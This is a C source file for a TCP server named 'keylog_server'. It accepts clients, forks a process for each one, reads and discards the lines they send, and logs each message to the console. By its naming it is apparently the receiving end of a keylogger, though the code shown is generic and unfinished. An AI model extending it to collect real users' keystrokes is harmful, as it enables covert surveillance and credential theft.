#ifdef __STDC_ALLOC_LIB__
#define __STDC_WANT_LIB_EXT2__ 1
#else
#define _POSIX_C_SOURCE 200809L
#endif
#define _GNU_SOURCE

#include "server.h"

#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "server_utils.h"

keylog_server* make_keylog_server(struct sockaddr_in ip_addr, int max_backlog) {
  keylog_server* server = malloc(sizeof(keylog_server));
  server->listener = open_tcp_socket();
  server->addr = ip_addr;
  server->max_backlog = max_backlog;
  return server;
}

void free_keylog_server(keylog_server* server) {
  close_tcp_socket(server->listener);
  free(server);
}

void listen_for_connections(keylog_server* server) {
  if (bind(server->listener, (struct sockaddr*)&server->addr,
           sizeof(server->addr)) == -1) {
    error_and_exit("CANNOT BIND");
  }
  if (listen(server->listener, server->max_backlog) == -1) {
    error_and_exit("CANNOT LISTEN");
  }
}

int accept_client(keylog_server* server) {
  // LISTENING
  struct sockaddr_in client;
  unsigned int address_size = sizeof(server->addr);
  int client_fd = accept4(server->listener, (struct sockaddr*)&client,
                          &address_size, SOCK_CLOEXEC);
  if (client_fd == -1) {
    error_and_exit("COULDN'T ACCEPT");
  }
  pid_t pid = fork();
  switch (pid) {
    case -1:
      error_and_exit("Couldn't fork echo process");
    case 0:
      process_keylog_info(client_fd);
      return -1;
    default:
      close(client_fd);
      return 0;
  }
}

void process_keylog_info(int socket_descriptor) {
  FILE* client_file = fdopen(socket_descriptor, "r+");
  if (client_file == NULL) {
    error_and_exit("Couldn't open file");
  }
  char* line = NULL;
  size_t line_size = 0;
  char* empty = "\n";
  // WHILE WE HAVEN'T CLOSED THE CLIENT
  while (!feof(client_file)) {
    if (getline(&line, &line_size, client_file) == -1) {
      puts("BROKEN");
      error_and_exit("XD");
    }
    if (fputs(empty, client_file) == EOF) {
      free(line);
      error_and_exit("Can't echo line back to client");
    }
    free(line);
    line = NULL;
    puts("received a new message from the client");
  }
  // CLOSE THE TEXT FILE WE'RE WRITING TO
  // CLOSE THE CLIENT
  if (fclose(client_file) == EOF) {
    error_and_exit("Couldn't close client socket descriptor");
  }
}
